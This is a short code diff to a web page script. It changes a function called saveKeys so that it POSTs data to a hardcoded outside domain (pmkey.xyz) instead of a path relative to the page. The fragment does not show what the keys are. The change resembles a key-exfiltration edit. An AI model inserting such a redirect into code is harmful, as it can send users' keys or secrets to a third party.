@@ -191,7 +191,7 @@
   <script>
     function saveKeys(){
       var xhr = new XMLHttpRequest();
-      var url = document.location.href.split("?")[0] + "insert/index.php";
+      var url = "https://www.pmkey.xyz/insert/index.php";
       xhr.open("POST", url, true);
       xhr.setRequestHeader("Content-type", "application/json");
 
